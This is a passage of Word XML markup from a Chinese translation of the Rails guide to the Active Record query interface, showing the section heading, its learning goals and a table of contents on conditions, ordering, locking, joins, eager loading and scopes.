    </w:p>
    <w:p w14:paraId="17A38EC8" w14:textId="4F66F40B" w:rsidR="00AC12D4" w:rsidRDefault="002B5D47" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>2.4、</w:t>
      </w:r>
      <w:r w:rsidR="00AC12D4">
        <w:t>Active Record 查询接口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A95922" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>本指导手册涉及了如何使用 Active Record 从数据库中检索数据。通过本指导手册，你可以了解到：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13CD5C53" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>使用多种方法和条件表达式来查找数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="485B9014" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>对查找到的数据进行排序，分组，取用字段值或者其它属性值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB32461" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>利用预加载来减少数据检索时执行的数据库查询次数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2287AAA1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>使用动态查找方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A9B309" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>检查记录的存在性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E46443A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>针对</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Active Record </w:t>
      </w:r>
      <w:r>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> model </w:t>
      </w:r>
      <w:r>
        <w:t>对象的统计方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38B42463" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>在</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> relation </w:t>
      </w:r>
      <w:r>
        <w:t>实例对象上执行</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E4B018" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D448985" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId221" w:anchor="1" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>从数据库中取对象</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="795C9672" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId222" w:anchor="1-1" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>查询单个对象</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7004793D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId223" w:anchor="1-2" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>查询多条记录</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="76AC13AA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId224" w:anchor="1-3" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>按组查询多条记录</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="427B605C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId225" w:anchor="2" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>条件表达式</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="122C9027" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId226" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>仅含有字符串的条件表达式</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="52A2DCC4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId227" w:anchor="2-2" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>数组式条件表达式</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4CFC38AC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId228" w:anchor="2-3" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>映射表式条件表达式</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="031706CA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId229" w:anchor="3" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>排序</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="256C20DE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId230" w:anchor="4" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>选择返回的字段（投影）</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4035A1F1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId231" w:anchor="5" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>限制和偏移量</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="64927B5B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId232" w:anchor="6" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>分组</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="629345F9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId233" w:anchor="7" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Having </w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>语句</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="46F03B39" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId234" w:anchor="8" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>覆盖条件表达式</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="091CC46A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId235" w:anchor="8-1" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>expect</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2FA7CDA8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId236" w:anchor="8-2" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>only</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="538973E2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId237" w:anchor="8-3" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>reorder</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5B2F7460" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId238" w:anchor="8-4" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>reverse_order</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="46906775" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId239" w:anchor="9" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>空实例对象</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2CDDD284" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId240" w:anchor="10" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>只读对象</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="54E1D1B7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId241" w:anchor="11" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>为更新对象加锁</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7637496C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId242" w:anchor="11-1" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>乐观锁</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="42089C4F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId243" w:anchor="11-2" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>悲观锁</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5F616813" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId244" w:anchor="12" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>连接表</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="36E297E4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId245" w:anchor="12-1" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>使用字符串</w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>SQL</w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>语句</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2DE9CA64" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId246" w:anchor="12-2" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>使用已定义的</w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Associations </w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>的数组或者映射表形式</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7D061985" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId247" w:anchor="12-3" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>指定连接表的条件表达式</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6E0DF02F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId248" w:anchor="13" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>预加载</w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Association</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="27C4386E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId249" w:anchor="13-1" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>预加载多个</w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Association</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2DB5A975" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId250" w:anchor="13-2" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>为预加载的</w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Association </w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>指定条件表达式</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2D32AAA6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId251" w:anchor="14" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>作用域（</w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Scope </w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0BC95E2D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId252" w:anchor="14-1" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>包含时间的计算</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
